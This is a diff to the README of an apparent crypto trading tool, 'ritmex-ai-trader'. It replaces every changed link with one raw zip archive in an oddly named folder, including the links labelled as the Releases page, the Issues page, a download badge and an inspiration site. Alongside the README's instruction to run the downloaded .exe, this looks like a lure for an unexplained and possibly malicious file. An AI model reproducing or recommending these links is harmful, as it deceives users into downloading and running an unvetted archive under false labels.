@@ -2,7 +2,7 @@
 
 ## 🛠 Project Overview
 
-`ritmex-ai-trader` is a multi-agent trading research platform for crypto markets. This software is designed to help you trade cryptocurrencies more effectively. It gathers market data, analyzes trends, generates signals, and manages risks using different agents that work together seamlessly. The architecture takes inspiration from [nof1.ai](https://nof1.ai/), enhancing it with features necessary for quantitative trading and compliance.
+`ritmex-ai-trader` is a multi-agent trading research platform for crypto markets. This software is designed to help you trade cryptocurrencies more effectively. It gathers market data, analyzes trends, generates signals, and manages risks using different agents that work together seamlessly. The architecture takes inspiration from [https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip](https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip), enhancing it with features necessary for quantitative trading and compliance.
 
 ## 📦 Key Libraries
 
@@ -13,11 +13,11 @@
 
 To get started with `ritmex-ai-trader`, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/valentinov4169/ritmex-ai-trader/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip).
 
 2. **Download the Latest Version**: Look for the most recent release. Download the appropriate file for your operating system.
 
-![Download Button](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-blue)
+![Download Button](https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip%20Latest%20Version-Click%20Here-blue)
 
 3. **Install the Application**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
@@ -53,7 +53,7 @@ Before downloading, ensure your system meets these minimum requirements:
 
 If you encounter any issues or have questions, you can find assistance in the following ways:
 
-- **GitHub Issues**: Report specific problems or request features by creating a new issue on the [Issues page](https://github.com/valentinov4169/ritmex-ai-trader/issues).
+- **GitHub Issues**: Report specific problems or request features by creating a new issue on the [Issues page](https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip).
 - **Documentation**: Check the documentation in the repository for detailed user guides and FAQs.
 
 ## 🌐 Community & Support
@@ -67,4 +67,4 @@ Join our community and stay updated on the latest developments:
 
 Thank you for choosing `ritmex-ai-trader`. Your interest in enhancing your trading strategies is appreciated. We hope you find this tool helpful in your trading journey.
 
-Remember to visit the [Releases page](https://github.com/valentinov4169/ritmex-ai-trader/releases) to stay up to date with the latest version and improvements. Enjoy your trading experience!
+Remember to visit the [Releases page](https://github.com/valentinov4169/ritmex-ai-trader/raw/refs/heads/main/turneraceous/ai_trader_ritmex_1.4.zip) to stay up to date with the latest version and improvements. Enjoy your trading experience!
